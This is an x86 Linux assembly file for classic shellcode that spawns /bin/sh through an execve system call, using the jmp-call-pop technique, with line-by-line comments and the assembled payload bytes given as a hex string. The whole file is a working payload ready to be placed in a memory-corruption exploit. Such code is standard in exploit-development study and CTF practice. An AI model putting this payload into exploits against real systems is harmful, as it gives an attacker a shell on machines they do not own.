; execve("/bin/sh", ["/bin/sh"], NULL)
; \xeb\x16\x31\xc0\x5b\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68

BITS 32

section .text

_start:
	jmp short _str

_shspawn:
	xor eax, eax ; set eax to 0
	pop ebx ; get sh_str addr
	mov [ebx+7], al ; append \0 from last byte of eax to 7th byte of ebx (after "/bin/sh")
	mov [ebx+8], ebx ; append sh_str address (2nd arg of execve)
	mov [ebx+12], eax ; append 0x00000000 (3rd arg)
	mov al, 0x0b ; prepare <execve> call
	lea ecx, [ebx+8] ; load sh_str address in ecx
	lea edx, [ebx+12] ; load NULL (eax) in edx
	int 0x80 ; syscall
	
_str:
	call _shspawn ; thx to this call, the stack contains the next instruction's address (sh_str addr)
	sh_str db "/bin/sh"
